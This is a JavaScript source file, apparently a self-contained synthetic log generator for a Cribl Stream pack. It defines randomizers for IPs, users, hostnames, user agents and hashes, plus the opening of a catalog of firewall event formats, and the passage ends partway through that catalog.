'use strict';

/**
 * DataTap Bundled Engine for Cribl Stream Pack
 * ==============================================
 * Self-contained event generation engine. No filesystem access, no external
 * requires (except Node built-in `crypto`). Designed to run inside Cribl's
 * JavaScript sandbox.
 *
 * Generates production-realistic events for 241+ sourcetypes:
 *   - 5 detailed definitions (pan:traffic, syslog, WinEventLog:Security,
 *     crowdstrike:falcon:event, okta:system) with variant support
 *   - 236+ catalog entries with compact shorthand notation
 *
 * (c) DataDay Technology Solutions
 */

const crypto = require('crypto');

// ============================================================================
// RANDOMIZERS
// ============================================================================

function seededRNG(seed) {
  let s = typeof seed === 'number' ? seed : 0;
  const str = String(seed);
  for (let i = 0; i < str.length; i++) {
    s = ((s << 5) - s + str.charCodeAt(i)) | 0;
  }
  return function next(min, max) {
    if (min === undefined) min = 0;
    if (max === undefined) max = 1;
    s = (s * 1664525 + 1013904223) & 0x7fffffff;
    return min + (s / 0x7fffffff) * (max - min);
  };
}

function pickRandom(arr, seed) {
  if (seed !== undefined) {
    const rng = seededRNG(seed);
    return arr[Math.floor(rng(0, arr.length))];
  }
  return arr[crypto.randomInt(arr.length)];
}

function weightedChoice(items, weights, seed) {
  const total = weights.reduce((a, b) => a + b, 0);
  let r;
  if (seed !== undefined) {
    const rng = seededRNG(seed);
    r = rng(0, total);
  } else {
    r = Math.random() * total;
  }
  let cumulative = 0;
  for (let i = 0; i < items.length; i++) {
    cumulative += weights[i];
    if (r < cumulative) return items[i];
  }
  return items[items.length - 1];
}

function randomIntInRange(min, max, seed) {
  if (seed !== undefined) {
    const rng = seededRNG(seed);
    return Math.floor(rng(min, max + 1));
  }
  return crypto.randomInt(min, max + 1);
}

function randomFloat(min, max, seed) {
  if (seed !== undefined) {
    const rng = seededRNG(seed);
    return rng(min, max);
  }
  return min + Math.random() * (max - min);
}

// ---------------------------------------------------------------------------
// Network randomizers
// ---------------------------------------------------------------------------

function ipToInt(ip) {
  const parts = ip.split('.').map(Number);
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

function intToIP(int) {
  return [
    (int >>> 24) & 0xff,
    (int >>> 16) & 0xff,
    (int >>> 8) & 0xff,
    int & 0xff,
  ].join('.');
}

function cidrToRange(cidr) {
  const [ip, prefixStr] = cidr.split('/');
  const prefix = parseInt(prefixStr, 10);
  const ipInt = ipToInt(ip);
  const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
  const start = (ipInt & mask) >>> 0;
  const end = (start | (~mask >>> 0)) >>> 0;
  return { start, end };
}

function randomIPv4(cidr, seed) {
  if (cidr) {
    const { start, end } = cidrToRange(cidr);
    const ip = randomIntInRange(start, end, seed);
    return intToIP(ip);
  }
  const a = randomIntInRange(1, 254, seed);
  const b = randomIntInRange(0, 255, seed !== undefined ? seed + 1 : undefined);
  const c = randomIntInRange(0, 255, seed !== undefined ? seed + 2 : undefined);
  const d = randomIntInRange(1, 254, seed !== undefined ? seed + 3 : undefined);
  return `${a}.${b}.${c}.${d}`;
}

function randomIPv4Weighted(config, seed) {
  const entries = [];
  const weights = [];
  if (config.internal) {
    for (const item of config.internal) {
      entries.push({ cidr: item.cidr, type: 'internal' });
      weights.push(item.weight);
    }
  }
  if (config.external) {
    for (const item of config.external) {
      entries.push({ cidr: item.cidr, type: 'external' });
      weights.push(item.weight);
    }
  }
  const chosen = weightedChoice(entries, weights, seed);
  return randomIPv4(chosen.cidr, seed);
}

const RESERVED_FIRST_OCTETS = new Set([0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]);

const SAFE_FIRST_OCTETS = [];
for (let i = 1; i <= 223; i++) {
  if (!RESERVED_FIRST_OCTETS.has(i)) SAFE_FIRST_OCTETS.push(i);
}

function randomPublicIP(seed) {
  let attempts = 0;
  while (attempts < 20) {
    const a = randomIntInRange(1, 223, seed !== undefined ? seed + attempts : undefined);
    if (!RESERVED_FIRST_OCTETS.has(a)) {
      const b = randomIntInRange(0, 255, seed !== undefined ? seed + attempts + 1 : undefined);
      const c = randomIntInRange(0, 255, seed !== undefined ? seed + attempts + 2 : undefined);
      const d = randomIntInRange(1, 254, seed !== undefined ? seed + attempts + 3 : undefined);
      return `${a}.${b}.${c}.${d}`;
    }
    attempts++;
  }
  const a = pickRandom(SAFE_FIRST_OCTETS, seed !== undefined ? seed + 100 : undefined);
  const b = randomIntInRange(0, 255, seed !== undefined ? seed + 101 : undefined);
  const c = randomIntInRange(0, 255, seed !== undefined ? seed + 102 : undefined);
  const d = randomIntInRange(1, 254, seed !== undefined ? seed + 103 : undefined);
  return `${a}.${b}.${c}.${d}`;
}

const RFC1918_RANGES = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];

function randomPrivateIP(seed) {
  const cidr = pickRandom(RFC1918_RANGES, seed);
  return randomIPv4(cidr, seed);
}

function randomPort(type, seed) {
  switch (type) {
    case 'well-known':  return randomIntInRange(1, 1023, seed);
    case 'registered':  return randomIntInRange(1024, 49151, seed);
    case 'ephemeral':   return randomIntInRange(49152, 65535, seed);
    default:            return randomIntInRange(1, 65535, seed);
  }
}

// ---------------------------------------------------------------------------
// Identity randomizers
// ---------------------------------------------------------------------------

const FIRST_NAMES = [
  'James', 'Mary', 'Robert', 'Patricia', 'John', 'Jennifer', 'Michael', 'Linda',
  'David', 'Elizabeth', 'William', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Jessica',
  'Thomas', 'Sarah', 'Christopher', 'Karen', 'Charles', 'Lisa', 'Daniel', 'Nancy',
  'Matthew', 'Betty', 'Anthony', 'Margaret', 'Mark', 'Sandra', 'Donald', 'Ashley',
  'Steven', 'Kimberly', 'Paul', 'Emily', 'Andrew', 'Donna', 'Joshua', 'Michelle',
  'Kenneth', 'Carol', 'Kevin', 'Amanda', 'Brian', 'Dorothy', 'George', 'Melissa',
  'Timothy', 'Deborah',
];

const LAST_NAMES = [
  'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis',
  'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson',
  'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson',
  'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker',
  'Young', 'Allen', 'King', 'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill',
  'Flores', 'Green', 'Adams', 'Nelson', 'Baker', 'Hall', 'Rivera', 'Campbell',
  'Mitchell', 'Carter', 'Roberts',
];

const ADJECTIVES = [
  'brave', 'swift', 'silent', 'dark', 'bright', 'calm', 'fierce', 'noble',
  'vivid', 'bold', 'keen', 'rapid', 'warm', 'cool', 'sharp', 'quiet',
  'wild', 'free', 'pure', 'wise', 'agile', 'crimson', 'golden', 'silver',
  'iron', 'steel', 'amber', 'azure', 'cosmic', 'cyber', 'digital', 'electric',
];

const NOUNS = [
  'falcon', 'tiger', 'phoenix', 'wolf', 'eagle', 'panther', 'hawk', 'raven',
  'cobra', 'viper', 'orca', 'lynx', 'fox', 'bear', 'lion', 'shark',
  'dragon', 'storm', 'frost', 'blaze', 'atlas', 'blade', 'bolt', 'canyon',
  'cipher', 'comet', 'condor', 'coyote', 'crown', 'dagger', 'ember', 'fang',
];

const DEPARTMENTS = [
  'engineering', 'security', 'ops', 'finance', 'sales', 'marketing',
  'hr', 'legal', 'support', 'devops', 'infrastructure', 'platform',
  'data-science', 'analytics', 'product', 'design', 'qa', 'release-eng',
];

const LOCATIONS = [
  'NYC', 'LAX', 'CHI', 'DFW', 'SEA', 'SFO', 'BOS', 'ATL', 'DEN', 'MIA',
  'IAD', 'PHX', 'PDX', 'MSP', 'DTW', 'IAH', 'AUS', 'SLC', 'CLT', 'PHL',
  'LHR', 'FRA', 'AMS', 'CDG', 'DUB', 'ARN', 'ZRH', 'NRT', 'SIN', 'SYD',
  'BOM', 'ICN', 'HKG', 'GRU', 'YYZ',
];

const ROLES = [
  'WKS', 'SRV', 'DB', 'WEB', 'APP', 'FW', 'LB', 'DNS', 'VPN', 'NAS',
  'API', 'GW', 'PROXY', 'MQ', 'CACHE', 'LOG', 'MON', 'CI', 'SCAN',
  'MAIL', 'AUTH', 'FS', 'HPC', 'GPU', 'K8S', 'VAULT', 'SIEM',
];

const TLDS = [
  'com', 'net', 'org', 'io', 'co', 'dev', 'app', 'tech', 'cloud', 'systems',
  'info', 'biz', 'us', 'uk', 'de', 'eu', 'ai', 'solutions', 'digital',
  'global', 'group', 'services', 'security', 'network', 'company', 'software',
];

const DOMAIN_WORDS = [
  'acme', 'globex', 'initech', 'umbrella', 'stark', 'wayne', 'oscorp', 'cyberdyne',
  'aperture', 'soylent', 'massive', 'dynamic', 'vertex', 'nexus', 'quantum', 'cipher',
  'synth', 'nova', 'arc', 'pulse', 'apex', 'atlas', 'aurora', 'beacon',
  'bridge', 'carbon', 'catalyst', 'centauri', 'cirrus', 'cobalt', 'compass',
  'core', 'cortex', 'crimson', 'crux', 'dataflow', 'delta', 'echo',
  'ember', 'envoy', 'epoch', 'falcon', 'flux', 'forge', 'frontier',
  'fusion', 'granite', 'harbor', 'helix', 'horizon', 'hyperion', 'ionic',
  'iron', 'keystone', 'lattice', 'lunar', 'mantis', 'matrix', 'meridian',
  'meteor', 'nebula', 'nimbus', 'oasis', 'omega', 'onyx', 'orbit',
  'oxide', 'paladin', 'pinnacle', 'prism', 'radiant', 'relay', 'ridge',
  'ripple', 'rover', 'scalar', 'sentinel', 'sierra', 'signal', 'solar',
  'spark', 'spectra', 'sphere', 'stratus', 'summit', 'swift', 'tango',
  'terra', 'titan', 'trident', 'vector', 'venture', 'vortex', 'zenith',
];

const OS_LIST = [
  'Windows NT 10.0; Win64; x64',
  'Windows NT 10.0; WOW64',
  'Windows NT 6.1; Win64; x64',
  'Windows NT 11.0; Win64; x64',
  'Macintosh; Intel Mac OS X 10_15_7',
  'Macintosh; Intel Mac OS X 14_2_1',
  'Macintosh; Apple M1 Mac OS X 14_3',
  'X11; Linux x86_64',
  'X11; Ubuntu; Linux x86_64',
  'Linux; Android 14; SM-S918B',
  'Linux; Android 13; Pixel 7',
  'iPhone; CPU iPhone OS 17_4 like Mac OS X',
  'iPad; CPU OS 17_3 like Mac OS X',
];

const BROWSER_TEMPLATES = [
  { engine: 'AppleWebKit/537.36', browser: 'Chrome', vMin: 100, vMax: 126, suffix: 'Safari/537.36' },
  { engine: 'AppleWebKit/537.36', browser: 'Chrome', vMin: 100, vMax: 126, suffix: 'Safari/537.36 Edg/${v}.0.${sv}.${patch}' },
  { engine: 'Gecko/20100101', browser: 'Firefox', vMin: 100, vMax: 127, suffix: '' },
  { engine: 'AppleWebKit/605.1.15', browser: 'Version', vMin: 15, vMax: 17, suffix: 'Safari/605.1.15' },
  { engine: 'AppleWebKit/537.36', browser: 'Chrome', vMin: 110, vMax: 126, suffix: 'Mobile Safari/537.36' },
  { engine: 'curl', browser: 'curl', vMin: 7, vMax: 8, suffix: '' },
  { engine: 'python-requests', browser: 'python-requests', vMin: 2, vMax: 2, suffix: '' },
];

const NAME_PREFIXES = ['Al', 'Br', 'Ca', 'Da', 'El', 'Fa', 'Ga', 'Ha', 'Ja', 'Ka', 'La', 'Ma', 'Na', 'Ra', 'Sa', 'Ta', 'Va', 'Za'];
const NAME_SUFFIXES = ['an', 'en', 'in', 'on', 'ar', 'er', 'ir', 'or', 'ay', 'ey', 'ia', 'ea', 'is', 'us', 'el', 'al', 'yn', 'lyn', 'ston', 'den'];

function proceduralName(seed) {
  const p = pickRandom(NAME_PREFIXES, seed);
  const s = pickRandom(NAME_SUFFIXES, seed !== undefined ? seed + 7 : undefined);
  return p + s;
}

function proceduralHostname(seed) {
  const role = pickRandom(ROLES, seed);
  const loc = pickRandom(LOCATIONS, seed !== undefined ? seed + 1 : undefined);
  const num = randomIntInRange(1, 9999, seed !== undefined ? seed + 2 : undefined);
  const rack = randomIntInRange(1, 12, seed !== undefined ? seed + 3 : undefined);
  if (num % 2 === 0) {
    return `${role}-${loc}-R${rack}-${String(num).padStart(4, '0')}`;
  }
  return `${role}-${loc}-${String(num).padStart(4, '0')}`;
}

function proceduralSerial(prefix, digitCount, seed) {
  prefix = prefix || '00725100';
  digitCount = digitCount || 7;
  const max = Math.pow(10, digitCount) - 1;
  const num = randomIntInRange(0, max, seed);
  return prefix + String(num).padStart(digitCount, '0');
}

function randomUsername(pattern, seed) {
  const useProcedural = crypto.randomInt(10) < 3;
  const first = useProcedural ? proceduralName(seed) : pickRandom(FIRST_NAMES, seed);
  const last = pickRandom(LAST_NAMES, seed !== undefined ? seed + 1 : undefined);
  switch (pattern) {
    case 'firstinitial.last':
      return `${first[0].toLowerCase()}.${last.toLowerCase()}`;
    case 'adjective-noun-number': {
      const adj = pickRandom(ADJECTIVES, seed);
      const noun = pickRandom(NOUNS, seed !== undefined ? seed + 1 : undefined);
      const num = randomIntInRange(1, 9999, seed !== undefined ? seed + 2 : undefined);
      return `${adj}-${noun}-${num}`;
    }
    case 'first.last':
    default:
      return `${first.toLowerCase()}.${last.toLowerCase()}`;
  }
}

function randomHostname(pattern, seed) {
  switch (pattern) {
    case 'adjective-noun': {
      const adj = pickRandom(ADJECTIVES, seed);
      const noun = pickRandom(NOUNS, seed !== undefined ? seed + 1 : undefined);
      return `${adj}-${noun}`;
    }
    case 'role-location-number':
    default: {
      const role = pickRandom(ROLES, seed);
      const loc = pickRandom(LOCATIONS, seed !== undefined ? seed + 1 : undefined);
      const num = randomIntInRange(1, 9999, seed !== undefined ? seed + 2 : undefined);
      return `${role}-${loc}-${String(num).padStart(4, '0')}`;
    }
  }
}

function randomDomain(seed) {
  const word = pickRandom(DOMAIN_WORDS, seed);
  const tld = pickRandom(TLDS, seed !== undefined ? seed + 1 : undefined);
  return `${word}.${tld}`;
}

function randomEmail(domain, seed) {
  const user = randomUsername('first.last', seed);
  const d = domain || randomDomain(seed !== undefined ? seed + 10 : undefined);
  return `${user}@${d}`;
}

function randomUserAgent(seed) {
  const tmpl = pickRandom(BROWSER_TEMPLATES, seed !== undefined ? seed + 1 : undefined);
  const majorVersion = randomIntInRange(tmpl.vMin, tmpl.vMax, seed !== undefined ? seed + 2 : undefined);
  const sv = randomIntInRange(0, 99, seed !== undefined ? seed + 3 : undefined);
  const patch = randomIntInRange(0, 9999, seed !== undefined ? seed + 4 : undefined);

  if (tmpl.engine === 'curl') {
    const minor = randomIntInRange(50, 88, seed !== undefined ? seed + 5 : undefined);
    return `curl/${majorVersion}.${minor}.0`;
  }
  if (tmpl.engine === 'python-requests') {
    const minor = randomIntInRange(20, 32, seed !== undefined ? seed + 5 : undefined);
    return `python-requests/${majorVersion}.${minor}.0`;
  }

  const os = pickRandom(OS_LIST, seed);

  if (tmpl.browser === 'Firefox') {
    return `Mozilla/5.0 (${os}; rv:${majorVersion}.0) ${tmpl.engine} Firefox/${majorVersion}.0`;
  }
  if (tmpl.browser === 'Version') {
    const minor = randomIntInRange(0, 6, seed !== undefined ? seed + 5 : undefined);
    return `Mozilla/5.0 (${os}) ${tmpl.engine} (KHTML, like Gecko) Version/${majorVersion}.${minor} ${tmpl.suffix}`;
  }

  let suffix = tmpl.suffix
    .replace('${v}', String(majorVersion))
    .replace('${sv}', String(sv))
    .replace('${patch}', String(patch));

  return `Mozilla/5.0 (${os}) ${tmpl.engine} (KHTML, like Gecko) Chrome/${majorVersion}.0.${sv}.${patch} ${suffix}`;
}

// ---------------------------------------------------------------------------
// Temporal randomizers
// ---------------------------------------------------------------------------

const MONTHS_SHORT = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

function pad(n, len) {
  return String(n).padStart(len || 2, '0');
}

function formatTimestamp(date, format) {
  const d = date instanceof Date ? date : new Date(date);
  switch (format) {
    case 'epoch':
      return Math.floor(d.getTime() / 1000);
    case 'epoch_ms':
      return d.getTime();
    case 'syslog': {
      const mon = MONTHS_SHORT[d.getMonth()];
      const day = pad(d.getDate());
      const h = pad(d.getHours());
      const m = pad(d.getMinutes());
      const s = pad(d.getSeconds());
      return `${mon} ${day} ${h}:${m}:${s}`;
    }
    case 'iso':
    default:
      return d.toISOString();
  }
}

function randomTimestamp(options, seed) {
  const opts = options || {};
  const base = opts.base ? new Date(opts.base).getTime() : Date.now();
  const jitterMs = opts.jitterMs || 0;
  const format = opts.format || 'iso';
  let ts = base;
  if (jitterMs > 0) {
    const offset = randomIntInRange(-jitterMs, jitterMs, seed);
    ts += offset;
  }
  return formatTimestamp(new Date(ts), format);
}

// ---------------------------------------------------------------------------
// Security randomizers
// ---------------------------------------------------------------------------

const HEX_CHARS = '0123456789abcdef';
const ALPHANUM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

function randomHex(length, seed) {
  const chars = [];
  for (let i = 0; i < length; i++) {
    const idx = randomIntInRange(0, 15, seed !== undefined ? seed + i : undefined);
    chars.push(HEX_CHARS[idx]);
  }
  return chars.join('');
}

function randomAlphaNum(length, seed) {
  const chars = [];
  for (let i = 0; i < length; i++) {
    const idx = randomIntInRange(0, ALPHANUM.length - 1, seed !== undefined ? seed + i : undefined);
    chars.push(ALPHANUM[idx]);
  }
  return chars.join('');
}

function randomUUID(seed) {
  if (seed !== undefined) {
    const hex = randomHex(32, seed);
    return [
      hex.slice(0, 8),
      hex.slice(8, 12),
      '4' + hex.slice(13, 16),
      ((parseInt(hex[16], 16) & 0x3) | 0x8).toString(16) + hex.slice(17, 20),
      hex.slice(20, 32),
    ].join('-');
  }
  return crypto.randomUUID();
}

function randomSHA256(seed) {
  if (seed !== undefined) {
    return randomHex(64, seed);
  }
  return crypto.createHash('sha256').update(crypto.randomBytes(32)).digest('hex');
}

function randomMD5(seed) {
  if (seed !== undefined) {
    return randomHex(32, seed);
  }
  return crypto.createHash('md5').update(crypto.randomBytes(16)).digest('hex');
}

function randomSessionID(length, seed) {
  return randomAlphaNum(length || 32, seed);
}

// ---------------------------------------------------------------------------
// Geo randomizers (simplified)
// ---------------------------------------------------------------------------

const CITIES = [
  { city: 'New York', region: 'New York', country: 'United States', countryCode: 'US', lat: 40.7128, lon: -74.0060, timezone: 'America/New_York' },
  { city: 'Los Angeles', region: 'California', country: 'United States', countryCode: 'US', lat: 33.9425, lon: -118.2551, timezone: 'America/Los_Angeles' },
  { city: 'Chicago', region: 'Illinois', country: 'United States', countryCode: 'US', lat: 41.8781, lon: -87.6298, timezone: 'America/Chicago' },
  { city: 'Houston', region: 'Texas', country: 'United States', countryCode: 'US', lat: 29.7604, lon: -95.3698, timezone: 'America/Chicago' },
  { city: 'Dallas', region: 'Texas', country: 'United States', countryCode: 'US', lat: 32.7767, lon: -96.7970, timezone: 'America/Chicago' },
  { city: 'San Francisco', region: 'California', country: 'United States', countryCode: 'US', lat: 37.7749, lon: -122.4194, timezone: 'America/Los_Angeles' },
  { city: 'Seattle', region: 'Washington', country: 'United States', countryCode: 'US', lat: 47.6062, lon: -122.3321, timezone: 'America/Los_Angeles' },
  { city: 'Denver', region: 'Colorado', country: 'United States', countryCode: 'US', lat: 39.7392, lon: -104.9903, timezone: 'America/Denver' },
  { city: 'Atlanta', region: 'Georgia', country: 'United States', countryCode: 'US', lat: 33.7490, lon: -84.3880, timezone: 'America/New_York' },
  { city: 'Miami', region: 'Florida', country: 'United States', countryCode: 'US', lat: 25.7617, lon: -80.1918, timezone: 'America/New_York' },
  { city: 'Boston', region: 'Massachusetts', country: 'United States', countryCode: 'US', lat: 42.3601, lon: -71.0589, timezone: 'America/New_York' },
  { city: 'Washington', region: 'District of Columbia', country: 'United States', countryCode: 'US', lat: 38.9072, lon: -77.0369, timezone: 'America/New_York' },
  { city: 'Austin', region: 'Texas', country: 'United States', countryCode: 'US', lat: 30.2672, lon: -97.7431, timezone: 'America/Chicago' },
  { city: 'Toronto', region: 'Ontario', country: 'Canada', countryCode: 'CA', lat: 43.6532, lon: -79.3832, timezone: 'America/Toronto' },
  { city: 'London', region: 'England', country: 'United Kingdom', countryCode: 'GB', lat: 51.5074, lon: -0.1278, timezone: 'Europe/London' },
  { city: 'Frankfurt', region: 'Hesse', country: 'Germany', countryCode: 'DE', lat: 50.1109, lon: 8.6821, timezone: 'Europe/Berlin' },
  { city: 'Amsterdam', region: 'North Holland', country: 'Netherlands', countryCode: 'NL', lat: 52.3676, lon: 4.9041, timezone: 'Europe/Amsterdam' },
  { city: 'Paris', region: 'Ile-de-France', country: 'France', countryCode: 'FR', lat: 48.8566, lon: 2.3522, timezone: 'Europe/Paris' },
  { city: 'Dublin', region: 'Leinster', country: 'Ireland', countryCode: 'IE', lat: 53.3498, lon: -6.2603, timezone: 'Europe/Dublin' },
  { city: 'Stockholm', region: 'Stockholm', country: 'Sweden', countryCode: 'SE', lat: 59.3293, lon: 18.0686, timezone: 'Europe/Stockholm' },
  { city: 'Tokyo', region: 'Tokyo', country: 'Japan', countryCode: 'JP', lat: 35.6762, lon: 139.6503, timezone: 'Asia/Tokyo' },
  { city: 'Singapore', region: 'Singapore', country: 'Singapore', countryCode: 'SG', lat: 1.3521, lon: 103.8198, timezone: 'Asia/Singapore' },
  { city: 'Mumbai', region: 'Maharashtra', country: 'India', countryCode: 'IN', lat: 19.0760, lon: 72.8777, timezone: 'Asia/Kolkata' },
  { city: 'Seoul', region: 'Seoul', country: 'South Korea', countryCode: 'KR', lat: 37.5665, lon: 126.9780, timezone: 'Asia/Seoul' },
  { city: 'Sydney', region: 'New South Wales', country: 'Australia', countryCode: 'AU', lat: -33.8688, lon: 151.2093, timezone: 'Australia/Sydney' },
  { city: 'Sao Paulo', region: 'Sao Paulo', country: 'Brazil', countryCode: 'BR', lat: -23.5505, lon: -46.6333, timezone: 'America/Sao_Paulo' },
  { city: 'Dubai', region: 'Dubai', country: 'United Arab Emirates', countryCode: 'AE', lat: 25.2048, lon: 55.2708, timezone: 'Asia/Dubai' },
  { city: 'Lagos', region: 'Lagos', country: 'Nigeria', countryCode: 'NG', lat: 6.5244, lon: 3.3792, timezone: 'Africa/Lagos' },
  { city: 'Mexico City', region: 'Mexico City', country: 'Mexico', countryCode: 'MX', lat: 19.4326, lon: -99.1332, timezone: 'America/Mexico_City' },
  { city: 'Shanghai', region: 'Shanghai', country: 'China', countryCode: 'CN', lat: 31.2304, lon: 121.4737, timezone: 'Asia/Shanghai' },
];

function hashIPToIndex(ip) {
  const parts = ip.split('.').map(Number);
  let h = 2166136261 >>> 0;
  for (let i = 0; i < parts.length; i++) {
    h ^= parts[i];
    h = Math.imul(h, 16777619) >>> 0;
  }
  return h % CITIES.length;
}

function randomGeoIP(ip, seed) {
  if (ip) {
    const idx = hashIPToIndex(ip);
    const c = CITIES[idx];
    return { country: c.country, countryCode: c.countryCode, city: c.city, region: c.region, lat: c.lat, lon: c.lon, timezone: c.timezone };
  }
  const c = pickRandom(CITIES, seed);
  return { country: c.country, countryCode: c.countryCode, city: c.city, region: c.region, lat: c.lat, lon: c.lon, timezone: c.timezone };
}


// ============================================================================
// CATALOG — Compact shorthand definitions for 236+ sourcetypes
// ============================================================================

// Field shorthand parser — expands compact notation to full field definitions
function parseField(shorthand) {
  const parts = shorthand.split(':');
  const name = parts[0];

  const KNOWN = {
    ts: { type: 'timestamp', config: { format: 'iso', jitterMs: 5000 } },
    src_ip: { type: 'ip', config: { internal: [{ cidr: '10.0.0.0/8', weight: 0.5 }, { cidr: '192.168.0.0/16', weight: 0.3 }], external: [{ cidr: '0.0.0.0/0', weight: 0.2 }] } },
    dst_ip: { type: 'ip', config: { internal: [{ cidr: '10.0.0.0/8', weight: 0.3 }], external: [{ cidr: '0.0.0.0/0', weight: 0.7 }] } },
    client_ip: { type: 'ip', config: {} },
    ip: { type: 'ip', config: {} },
    src_port: { type: 'port', config: { type: 'ephemeral' } },
    dst_port: { type: 'port', config: { type: 'well-known' } },
    port: { type: 'port', config: {} },
    user: { type: 'username', config: { pattern: 'first.last' } },
    host: { type: 'hostname', config: { pattern: 'role-location-number' } },
    email: { type: 'email', config: {} },
    domain: { type: 'domain', config: {} },
    ua: { type: 'useragent', config: {} },
    uuid: { type: 'uuid', config: {} },
    sha256: { type: 'hash', config: { algorithm: 'sha256' } },
    md5: { type: 'hash', config: { algorithm: 'md5' } },
    sid: { type: 'string', config: { pattern: '{random_hex:16}' } },
    serial: { type: 'serial', config: { prefix: '00725100', digits: 7 } },
  };

  if (parts.length === 1 && KNOWN[name]) {
    return { name, type: KNOWN[name].type, config: Object.assign({}, KNOWN[name].config) };
  }

  const typeChar = parts[1];

  // Integer range: bytes:i:60-524288
  if (typeChar === 'i' && parts[2]) {
    const [min, max] = parts[2].split('-').map(Number);
    return { name, type: 'int', config: { min: min || 0, max: max || 65535 } };
  }

  // Float range: score:f:0-100
  if (typeChar === 'f' && parts[2]) {
    const [min, max] = parts[2].split('-').map(Number);
    return { name, type: 'float', config: { min: min || 0, max: max || 100 } };
  }

  // String with pool: name:s:val1,val2,val3
  if (typeChar === 's' && parts[2]) {
    const pool = parts[2].split(',');
    return { name, type: 'string', config: { pool } };
  }

  // Plain string
  if (typeChar === 's') {
    return { name, type: 'string', config: { pool: [] } };
  }

  // Enum: action:allow,deny,drop (no type prefix, just values with commas)
  if (parts.length === 2 && parts[1].includes(',')) {
    const values = parts[1].split(',');
    const weights = values.map((_, i) => i === 0 ? 0.5 : 0.5 / (values.length - 1));
    return { name, type: 'enum', config: { values, weights } };
  }

  // Enum with explicit type: status:e:success,failure
  if (typeChar === 'e' && parts[2]) {
    const values = parts[2].split(',');
    const weights = values.map((_, i) => i === 0 ? 0.5 : 0.5 / (values.length - 1));
    return { name, type: 'enum', config: { values, weights } };
  }

  // Fallback: treat as known type or string
  if (KNOWN[name]) return { name, type: KNOWN[name].type, config: Object.assign({}, KNOWN[name].config) };
  return { name, type: 'string', config: { pool: [] } };
}

// Hydrate a compact catalog entry into a full definition
function hydrate(sourcetype, entry) {
  const fields = entry.fl.split(' ').map(parseField);

  const def = {
    sourcetype,
    vendor: entry.v || 'Unknown',
    product: entry.p || 'Unknown',
    format: entry.f || 'json',
    description: entry.d || `${entry.v || ''} ${entry.p || ''} events`.trim(),
    fields,
    correlationHints: entry.ch || { actor_ip: 'src_ip', actor_user: 'user' },
  };

  // Build template based on format
  if (entry.tpl) {
    def.template = entry.tpl;
  } else if (entry.f === 'json') {
    const pairs = fields.map(f => `"${f.name}":"{{${f.name}}}"`).join(',');
    def.template = `{${pairs}}`;
  } else if (entry.f === 'csv') {
    def.template = fields.map(f => `{{${f.name}}}`).join(',');
  } else if (entry.f === 'kv') {
    def.template = fields.map(f => `${f.name}={{${f.name}}}`).join(' ');
  } else if (entry.f === 'tsv') {
    def.template = fields.map(f => `{{${f.name}}}`).join('\t');
  } else {
    def.template = fields.map(f => `{{${f.name}}}`).join(' ');
  }

  return def;
}

const CATALOG = {
  // ===== FIREWALLS =====
  'hillstone:fw': { v:'Hillstone', p:'SG-6000', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:permit,deny,drop proto:tcp,udp,icmp policy:s bytes:i:60-524288 zone_src:s:trust,untrust,dmz zone_dst:s:trust,untrust,dmz', tpl:'{{ts}} hillstone-fw {{action}} {{proto}} {{src_ip}}:{{src_port}} -> {{dst_ip}}:{{dst_port}} policy={{policy}} zone={{zone_src}}>{{zone_dst}} bytes={{bytes}}' },
  'huawei:fw': { v:'Huawei', p:'USG6000', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:permit,deny proto:TCP,UDP,ICMP policy:s:rule1,rule2,rule3,default zone_src:s:trust,untrust,dmz zone_dst:s:trust,untrust,dmz bytes:i:60-262144', tpl:'{{ts}} %%01POLICY/6/POLICY_MATCH: {{action}} {{proto}} {{src_ip}}:{{src_port}}->{{dst_ip}}:{{dst_port}} policy={{policy}} srczone={{zone_src}} dstzone={{zone_dst}}' },
  'sangfor:fw': { v:'Sangfor', p:'NGAF', f:'json', fl:'ts src_ip dst_ip src_port dst_port action:accept,reject,drop proto:tcp,udp user severity:low,medium,high,critical rule:s' },
  'stormshield:fw': { v:'Stormshield', p:'SNS', f:'kv', fl:'ts src_ip dst_ip src_port dst_port action:pass,block proto:tcp,udp,icmp iface:s:em0,em1,em2 rule:i:1-999 bytes:i:60-524288', tpl:'id=firewall time={{ts}} action={{action}} src={{src_ip}} dst={{dst_ip}} srcport={{src_port}} dstport={{dst_port}} proto={{proto}} rule={{rule}} bytes={{bytes}}' },
  'clavister:fw': { v:'Clavister', p:'NetWall', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:allow,deny,drop proto:tcp,udp rule:s severity:info,warning,error,critical', tpl:'{{ts}} clavister {{severity}} {{action}} {{proto}} {{src_ip}}:{{src_port}} -> {{dst_ip}}:{{dst_port}} rule={{rule}}' },
  'untangle:fw': { v:'Untangle', p:'NG Firewall', f:'json', fl:'ts src_ip dst_ip src_port dst_port action:pass,block,reject proto:TCP,UDP,ICMP policy:s:Default,Corporate,Guest bytes:i:60-524288 sid' },
  'kerio:fw': { v:'Kerio', p:'Control', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:Permit,Deny,Drop proto:TCP,UDP user rule:s bytes:i:60-262144', tpl:'{{ts}} kerio: {{action}} {{proto}} src={{src_ip}}:{{src_port}} dst={{dst_ip}}:{{dst_port}} user={{user}} rule={{rule}} bytes={{bytes}}' },
